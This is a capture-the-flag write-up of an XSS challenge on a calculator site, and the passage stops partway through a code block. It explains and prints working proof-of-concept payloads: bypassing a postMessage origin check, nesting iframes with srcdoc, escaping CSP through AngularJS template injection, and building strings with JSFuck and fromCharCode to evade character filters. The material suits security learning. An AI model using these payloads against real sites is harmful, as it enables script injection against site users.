+++
title = "Bugpoc XSS Challenge 2"
date = "2020-08-11T00:00:00+11:00"
author = "bad5ect0r"
authorTwitter = "bad5ect0r" #do not include @
cover = "/bugpoc-xss-challenge-2/cover.png"
tags = ["ctf", "xss", "webapp"]
keywords = ["angular", "jsfuck", "template injection"]
description = "Exploiting an open message reciever and an Angular CSTI to get cross site scripting on a seemingly innocuous site."
showFullContent = false
+++

# Introduction

Bug Poc was a bug bounty program that I was invited to when it was still private. One day, they sent a message to all their hackers that they were doing an XSS challenge with prizes. Since I live in Australia, I read this message only after waking up from my slumber – 4 hours after the challenge started. I solved the challenge pretty quickly since it was relatively easy. However, the prizes were all taken and I could not submit a solution😢.

The good news was that Bug Poc came back with a new challenge and boy was this a hard one! This time, people were allowed to submit solutions even after the 1st, 2nd, and 3rd place prizes were claimed. This is good because it encourages people to keep having a go and enjoy their time learning about intricate XSS bugs.

Without further ado, let’s get hacking!

# Challenge Details

**Challenge page**: http://calc.buggywebsite.com

## Rules

1. You must pop an `alert(domain)` showing `calc.buggywebsite.com`
2. You must bypass CSP
3. It must be reproducible using the latest version of Chrome
4. You must provide a working proof-of-concept on [bugpoc.com](https://bugpoc.com/)

# Step 1: Reading the Source Code

If you’re new to hacking, one thing that will surprise you is the limited input mechanisms available to us since we can’t type any custom input anywhere. You’re only allowed to press the calculator’s buttons.

![No free input boxes. Where’s the XSS?! 🤔](/bugpoc-xss-challenge-2/cover.png)

It is important that we look for other sources and sinks within the application’s source code. So we open the developer tools and have a dig around.

![Developer tools.](/bugpoc-xss-challenge-2/step1-source1.png)

We notice that there is an iframe called `theiframe` in this site. It appears to contain the contents of the display.

![`theiframe`](/bugpoc-xss-challenge-2/step1-theiframe.png)

Looking at the JS sources for custom source code (not libraries), we see the following:

![Source tree](/bugpoc-xss-challenge-2/step1-source-tree.png)

script.js contains Angular code that allows the calculator to function:

```js
var app = angular.module('Calculator', []);

app.controller('DisplayController', ['$scope', function($scope) {

    $scope.display = "";

}]);

app.controller('ArthmeticController', ['$scope', function($scope){

    $scope.operatorLastUsed = false;
    $scope.equation = "0";
    $scope.isFloat = false;
    $scope.isInit = true;
    $scope.isOff = false;

    $scope.concatOperator = function(operator) {
        
        if(operator === 'AC')
        {
            $scope.equation = "0";
            $scope.isInit = true;
        }
        else
        {
            if(!$scope.equation[$scope.equation.length - 1].match(/[-+*\/]/))
            {
                $scope.equation += operator;
                $scope.isFloat = false;
            }    
        }
        sendEquation($scope.equation);
    }
    
    $scope.command = function(command) {
        if(command === 'Off')
        {
            if($scope.isOff === false)
            {
                $(".display").css("color", '#95A799');
                sendEquation('off');
                $("button:contains('OFF')").text("ON");
                $scope.isOff = true;
            } else 
            {
                $(".display").css("color", 'black');
                sendEquation('on');
                $("button:contains('ON')").text("OFF");
                $scope.isOff = false;
            }
        } else if(command === '%') 
        {
            if(!$scope.equation[$scope.equation.length - 1].match('%'))
            {
                $scope.equation += "%";
            }
        } else if(command === 'DEL')
        {
            if($scope.equation.length == 1)
            {
                $scope.equation = $scope.equation.substring(0,$scope.equation.length - 1);
                $scope.equation = "0";
                $scope.isInit = true;
            } else {
                $scope.equation = $scope.equation.substring(0,$scope.equation.length - 1);
            }
        } 
        sendEquation($scope.equation);
    }
    
    $scope.addDecimal = function() {
        $scope.isFloat = true;
        $scope.equation += ".";
        sendEquation($scope.equation);
    }

    $scope.updateCurrNum = function(num) {
        if($scope.isInit)
        {
            $scope.equation = num.toString();
            $scope.isInit = false;
        } else 
            $scope.equation += num;
        
        sendEquation($scope.equation);

    }

    $scope.calculate = function() {
        $scope.equation = eval($scope.equation).toString();
        sendEquation($scope.equation);
    }

}]);

function sendEquation(msg){
    theiframe.postMessage(msg);
}
```

Key thing to note here is that there is a dangerous call to the `eval()` function in the `$scope.calculate` function. It is dangerous because it will evaluate any JS expression passed to it. If the input is user-controlled, we would have XSS.

If we read above, we can deduce that the `$scope.equation` variable being passed to the `eval()` call is, as the name suggests, the equation that the user types into the calculator. But since we do not have the freedom to type anything we want into the calculator, we can’t really get malicious input into the `eval()` call. When I was solving this, I had a sneaking suspicion that we would need to make use of this later in the exploit, so I took a note of it. Let’s read on…

frame.html contained the HTML for the `theiframe` iframe.

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'self'; object-src 'none'">
        <link href='https://fonts.googleapis.com/css?family=Ubuntu:400,700' rel='stylesheet' type='text/css'>
        <script src="frame.js"></script>
        <style>
        html {
            clear: both;
            font-family: digital;
            font-size: 24px;
            text-align: right;
            letter-spacing: 5px;
            font-family: 'Ubuntu', sans-serif;
            overflow: hidden;
        }
        </style>
        <title></title>
    </head>
    <body>
        0
    </body>
</html>
```

There isn’t much here that is noteworthy, except for the CSP meta tag:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'self'; object-src 'none'">
```

You can copy-paste this into [CSP Evaluator](https://csp-evaluator.withgoogle.com/) to learn exactly what it means:

![Resuls from CSP Evaluator.](/bugpoc-xss-challenge-2/step1-csp.png)

This basically means that we are allowed to

* Evaluate custom expressions in the `eval()` function.
* Include individual script files that appear under the challenge domain (calc.buggywebsite.com).

We are not allowed to inject custom scripts directly into the HTML page. This means we can’t inject things like `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`.

The same meta tag can be found in index.html. The challenge also required us to bypass the CSP. So this is definitely something we need to look at once we can get some custom HTML into the page.

Now let’s look at frame.js. This is included in the frame.html page.

```js
window.addEventListener("message", receiveMessage, false);

function receiveMessage(event) {

    // verify sender is trusted
    if (!/^http:\/\/calc.buggywebsite.com/.test(event.origin)) {
        return
    }
    
    // display message 
    msg = event.data;
    if (msg == 'off') {
        document.body.style.color = '#95A799';
    } else if (msg == 'on') {
        document.body.style.color = 'black';
    } else if (!msg.includes("'") && !msg.includes("&")) {
        document.body.innerHTML=msg;
    }
}
```

There is one function and that is an event handler for the message event. For those who don’t know what the message event is, it is basically a way for sites to communicate cross domain safely by posting and receiving message objects. Reading the function, we see that the message is being checked and certain DOM changes are happening. The most interesting one is their last case, where we are able to insert custom HTML into the body of the HTML document:

```js
} else if (!msg.includes("'") && !msg.includes("&")) {
    document.body.innerHTML=msg;
}
```

We have found our source and sink! Let’s start building the PoC.

```html
<!DOCTYPE HTML>

<html>
    <body>
        <iframe name="mriframe" src="http://calc.buggywebsite.com/frame.html" onload="run()"></iframe>

        <script>
            function run() {
                mriframe.postMessage("HI", "*");
            }
        </script>
    </body>
</html>
```

And nothing happens...

![We should be seeing “HI”…](/bugpoc-xss-challenge-2/step1-first-attempt.png)

# Step 2: Bypassing the Origin Check

If we have a closer look at the recieveMessage function, we can see what the issue is:

```js
// verify sender is trusted
if (!/^http:\/\/calc.buggywebsite.com/.test(event.origin)) {
    return
}
```

So we need to be able to bypass this check. We can use RegExr to try and find some possible weaknesses in the regex:

![We have some bypasses!](/bugpoc-xss-challenge-2/step2-checking-for-origin-bypass.png)

Since the regex is missing the $ at the end, we can use our own domain and create a subdomain that matches calc.buggywebsite.com to pass the check. Let’s edit /etc/hosts.

![Pointing calc.buggywebsite.com.au to our local server.](/bugpoc-xss-challenge-2/step2-etc-hosts.png)

Now, we see the message appear!

![Making progress.](/bugpoc-xss-challenge-2/step2-attempt2.png)

Now the challenge becomes choosing the correct XSS payload. We can insert things like images:

```html
<!DOCTYPE HTML>

<html>
    <body>
        <iframe name="mriframe" src="http://calc.buggywebsite.com/frame.html" onload="run()" width="500px" height="700px"></iframe>

        <script>
            function run() {
                mriframe.postMessage("<img src=\"https://pbs.twimg.com/profile_images/1209709211195588609/2VZwKoQq_400x400.jpg\">", "*");
            }
        </script>
    </body>
</html>
```

![Images load](/bugpoc-xss-challenge-2/step2-bad5ect0r.png)

But inserting basic XSS payloads won’t work due to the CSP we talked about earlier:

```html
<!DOCTYPE HTML>

<html>
    <body>
        <iframe name="mriframe" src="http://calc.buggywebsite.com/frame.html" onload="run()" width="500px" height="700px"></iframe>

        <script>
            function run() {
                mriframe.postMessage("<img src=x onerror=alert(1)>", "*");
            }
        </script>
    </body>
</html>
```

![Chrome console says no.](/bugpoc-xss-challenge-2/step2-csp-fail.png)

# Step 3: Bypassing CSP

When I was solving this challenge, this stumped me for a while. I knew that we could include script files on the calc.buggywebsite.com domain, but none of those had any calls to `alert()`. The script.js file had the `eval()` call, but since we had DOM XSS via the `innerHTML` property, we can’t include `<script src=x></script>` tags because the browser will not load scripts this way after the page had already finished loading.

```html
<!DOCTYPE HTML>

<html>
    <body>
        <iframe name="mriframe" src="http://calc.buggywebsite.com/frame.html" onload="run()" width="500px" height="700px"></iframe>

        <script>
            function run() {
                mriframe.postMessage("<script src=\"http://calc.buggywebsite.com/script.js\"><\/script>", "*");
            }
        </script>
    </body>
</html>
```

![Chrome network tab says no.](/bugpoc-xss-challenge-2/step3-including-script-js.png)

For more information on including script files with `innerHTML`, see [this excellent blog post](https://ghinda.net/article/script-tags/) by Ionuț Colceriu ([@ghindas](https://twitter.com/ghindas)). I cannot use any of the other methods described there because that would require injecting custom JS which is not allowed by the CSP. The CSP would’ve also prevented us from executing the `$scope.calculate()` function even if we could some how include script.js. This is because executing functions require custom JS as well.

So after staring at this blank page for a while, I remembered a stored XSS I got while hunting bugs for a company. They had an Export to Excel feature that would pop open a new window object with the `innerHTML` set to the file name.

```html
<html>
    <body>
        <input name="filename" id="filename" value="blah.xlsx">
        <button onclick="excel()">Export to Excel</button>
    </body>
    <script>
        function excel() {
            var w = window.open();
            w.document.body.innerHTML = "<h1>Please wait while we prepare " + filename.value;
        }
    </script>
</html>
```

![Example excel export](/bugpoc-xss-challenge-2/step3-gif1.gif)

Since this file name was user-controlled, we could insert our XSS payload and it would execute:

![Excel export alert](/bugpoc-xss-challenge-2/step3-gif2.gif)

So I thought, what if we could open an iframe within our iframe that includes the necessary JS source files? This is equivalent to running `window.open()` in the example above. Since the iframe loads an entire document dynamically, any `<script src=x></script>` tags we include inside it will also run.

We update our PoC as follows:

```html
<!DOCTYPE HTML>

<html>
    <body>
        <iframe name="mriframe" src="http://calc.buggywebsite.com/frame.html" onload="run()" width="500px" height="700px"></iframe>

        <script>
            function run() {
                mriframe.postMessage("<iframe srcdoc=\"<script src=script.js><\/script>\"></iframe>", "*");
            }
        </script>
    </body>
</html>
```

The srcdoc attribute in an iframe allows you to define the raw HTML to be presented in the iframe. From here on, I will only show the HTML in this iframe:

```html
<script src=script.js></script>
```

And this works!

![The browser fetches the script.js file!](/bugpoc-xss-challenge-2/step3-script-loaded.png)

But because the script.js file depends on the Angular library being present, we need to include it too. Luckily for us, we can do this without violating the CSP since there is an AngularJS file under the calc.buggywebsite.com domain:

```html
<script src=angular.min.js></script>
<script src=script.js></script>
```

Now it turns out all of this is still being executed under the context of the calc.buggywebsite.com.au domain. Which is good because if this was a real website, we would have an impactful XSS. However, it is also bad because the CSP still applies. To demonstrate this, we try and execute a `<script>alert(1)</script>` within our second iframe:

```html
<script src=angular.min.js></script>
<script src=script.js></script>
<script>alert(1)</script>
```

![Chrome console says no again!](/bugpoc-xss-challenge-2/step3-no-inline-scripts-in-iframe.png)

This is when I started doing some reading on CSP bypasses. I found this [awesome blog post](https://blog.deteact.com/csp-bypass/) by Omar Ganiev ([@ahack_ru](https://twitter.com/ahack_ru)) that goes through some bypasses based on different restrictions set by the CSP. One of the bypasses he mentions is effective when unsafe-eval is allowed. This is where we are able to abuse Client Side Template Injection (CSTI) to get something like Angular to run our code.

To test this, we try the following code in our second iframe:

```html
<script src=angular.min.js></script>
<script src=script.js></script>
<div ng-app=Calculator>
    <h1>{{7*7}}</h1>
</div>
```

This defines a container for the Calculator app that is being mentioned in the script.js file. Then we use an Angular template with an expression. If the expression gets evaluated, we know that we can bypass CSP this way:

![7 * 7 = 49](/bugpoc-xss-challenge-2/step3-csti.png)

Great! We can use this to bypass CSP.

So at this point I am trying to think of a way to reach that eval call with my custom input. since the call is `eval($scope.equation)`, I need to find a way to set `$scope.equation` to a custom value. That is when I found the `$scope.updateCurNum(num)` function in the script.js file.

```js
$scope.updateCurrNum = function(num) {
    if($scope.isInit)
    {
        $scope.equation = num.toString();
        $scope.isInit = false;
    } else 
        $scope.equation += num;
    
    sendEquation($scope.equation);

}
```

According to the source code, if I call `$scope.updateCurrNum(num)` passing a num that is a string while the calculator has not been used (it’s in its initial state), I can assign num to `$scope.equation`. At that point, I would be able to run `$scope.calculate()` which will run `eval($scope.equation)`. If num was set to `"alert(parent.location.hostname)"` the final `eval($scope.equation)` call will pop our desired alert box.

Let’s update the PoC and see what happens.

```html
<script src=angular.min.js></script>
<script src=script.js></script>
<div ng-app=Calculator ng-controller=ArthmeticController>
    <h1>{{a='alert(parent.location.hostname)';updateCurrNum(a);calculate();1+1}}</h1>
    <iframe name=theiframe></iframe>
</div>
```

So I have updated our main div tag to have the ng-controller directive set to ArthmeticController because that’s the controller that has the code that we need access to. I then proceed to make an expression that does the following:

1. Create a variable a that contains the string `'alert(parent.location.hostname)'`
2. Call `updateCurrNum(a)`. This will set `$scope.equation` equal to a since the “Calculator” is in its initial state (`$scope.isInit == true`).
3. Output `1+1` just so we have something to look at when all this runs. It also lets us know that everything before it ran.

I also added yet another iframe within our iframe that’s in the main iframe 😖. This is to satisfy the expectation of script.js that there is an iframe named `theiframe` in the current window (the middle iframe).

When we run this, we see that we get a 0 in our iframe again…

![Failed yet again…](/bugpoc-xss-challenge-2/step3-fail2.png)

# Step 4: Using JSFuck and Angular Sandbox Escapes

The reason for this is because the frame.js file does not allow us to use the `innerHTML` assignment if there is a single-quote (‘) or ampersand (&) in the message that we send.

```js
} else if (!msg.includes("'") && !msg.includes("&")) {
    document.body.innerHTML=msg;
}
```

It’s tripping up when we try to assign `a='alert(parent.location.hostname)'`. See the complete PoC file below:

![Single quotes](/bugpoc-xss-challenge-2/step4-single-quotes.png)

I know what you might be thinking: "Why don’t you just use a double-quote instead?" The problem with that is it will conflict with the srcdoc attribute in our main iframe. In HTML, the only way to escape a character like " while it is within a double-quoted string is to use HTML entities like `&quote;`, `&#34`, and `&#x22`. These do not suit us because frame.js also checks for ampersand (&).

So once again I hit a roadblock for a good few hours. I then remembered my past experience with CTFs and their use of esoteric languages – in particular: JSFuck.

JSFuck is an esoteric JavaScript language which only uses 6 characters: [, ], (, ), !, and +. What’s great about this is that there is no ' or &. So what if we can use JSFuck to build our string that we pass to `eval()`?

We use this [JSFuck encoder](http://www.jsfuck.com/) and assign its value to `a` in our expression:

```html
<script src=angular.min.js></script>
<script src=script.js></script>
<div ng-app=Calculator ng-controller=ArthmeticController>
    <h1>{{a=(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]];updateCurrNum(a);calculate();1+1}}</h1>
    <iframe name=theiframe></iframe>
</div>
```

This should work right? I mean, if you put it into the Chrome console, it outputs the string that we want:

![JSFuck](/bugpoc-xss-challenge-2/step4-jsfuck1.png)

However, when we try this in our PoC…

![The string is being passed to `eval()` but it’s mangled.](/bugpoc-xss-challenge-2/step4-jsfuck2.png)

Great! Our string is being passed to `eval()` we’re almost there! However, our original string "`alert(parent.location.hostname)"` is being mangled into `"alertaret.lat.stae"`:

![Debugging the error.](/bugpoc-xss-challenge-2/step4-debugging.png)

Okay. I was a bit confused here, but this probably has something to do with differences in how AngularJS expressions are evaluated compared to regular JS. If someone has a better answer, please leave a comment below and I can add it to this blog post so people know the truth😛.

So once again I was stuck. But then I remembered that there were several AngularJS sandbox bypasses that could allow you to access regular JavaScript objects and functions from within an Angular expression. I started to think of ways I could use an AngularJS sandbox bypass.

I could try and achieve full code exec. Then I wouldn’t need to call `$scope.calculate`, I could just exploit the sandbox and execute `alert(parent.location.hostname)`. I did some research on Angular sandbox bypasses. The most noteworthy research I consulted were:

* Gareth Heyes ([@garethheyes](https://twitter.com/garethheyes)) – [XSS without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)
* Gareth Heyes ([@garethheyes](https://twitter.com/garethheyes)) – [DOM based AngularJS sandbox escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)
* PortSwigger – [AngularJS sandbox](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox)

I tried to get code exec using these methods but failed. However, if you take a closer look at the last PortSwigger article, you will see the following:

![Portswigger quote.](/bugpoc-xss-challenge-2/step4-portswigger-quote.png)

I knew about the `String.fromCharCode()` trick to bypass quote filters in XSS in fact I’ve used it several times when doing other XSS challenges and even in bug bounties. But I didn’t think of using the constructor property to get the `fromCharCode()` function in an Angular expression. The article says that we would still need to find a way to build an initial string. We discovered that this was possible using JSFuck, just that some characters get mangled. So what if we could strike a middle ground? Using a single "a" string as the initial string and then using the constructor property from that to get the `fromCharCode()` function and then concatenate each character until we get the string that we want.

For example, the string "Hello World" can be built as follows:

1. The string "a" in JSFuck is as follows: `(![]+[])[+!+[]]`.
2. The character 'H' can be developed as follows: `((![]+[])[+!+[]]).constructor.fromCharCode(72)`.
3. So then the whole string `"Hello World"` is as follows:

```js
((![]+[])[+!+[]]).constructor.fromCharCode(72)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(32)+((![]+[])[+!+[]]).constructor.fromCharCode(87)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(100)
```

![Chrome console approves!](/bugpoc-xss-challenge-2/step4-angular-jsfuck1.png)

So then we can build the string "`alert(parent.location.hostname)"` like so:

```js
((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(40)+((![]+[])[+!+[]]).constructor.fromCharCode(112)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(99)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(105)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(104)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(115)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(109)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(41)
```

And add it to the value of the a variable in our expression:

```html
<script src=angular.min.js></script>
<script src=script.js></script>
<div ng-app=Calculator ng-controller=ArthmeticController>
